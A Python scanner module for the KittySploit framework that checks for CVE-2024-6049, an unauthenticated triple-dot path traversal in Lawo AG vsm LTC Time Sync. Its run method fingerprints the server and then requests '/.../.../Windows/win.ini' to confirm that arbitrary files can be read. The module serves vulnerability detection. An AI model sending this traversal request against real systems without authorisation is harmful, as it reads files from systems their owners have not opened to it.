#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The web server of Lawo AG vsm LTC Time Sync (vTimeSync) is affected by a "."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Lawo AG vsm LTC Time Sync (vTimeSync) - Path Traversal Detection',
        'description': 'The web server of Lawo AG vsm LTC Time Sync (vTimeSync) is affected by a "..." (triple dot) path traversal vulnerability. By sending a specially crafted HTTP request, an unauthenticated remote attacker could download arbitrary files from the operating system. As a limitation, the exploitation is only possible if the requested file has some file extension, e. g. .exe or .txt.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'lawo', 'vtimesync', 'lfi', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://lawo.com/lawo-downloads/',
            'https://r.sec-consult.com/lawo',
            'https://packetstormsecurity.com/files/182347/Lawo-AG-vsm-LTC-Time-Sync-Path-Traversal.html',
            'https://sec-consult.com/vulnerability-lab/advisory/unauthenticated-path-traversal-vulnerability-in-lawo-ag-vsm-ltc-time-sync-vtimesync/',
            'https://nvd.nist.gov/vuln/detail/cve-2024-6049',
        ],
        'cve': 'CVE-2024-6049',
    }

    def run(self):
        path = '/'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = (r.text or "").lower()
        body_any = ('vtimesync', 'lawo',)
        if not (any(m in body for m in body_any)):
            return False
        path = '/.../.../.../.../.../.../.../.../.../Windows/win.ini'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('bit app support', 'fonts', 'extensions',)
        if all(m in body for m in body_all):
            self.set_info(severity='high', reason='Lawo AG vsm LTC Time Sync (vTimeSync) - Path Traversal detected', path=path)
            return True
        return False

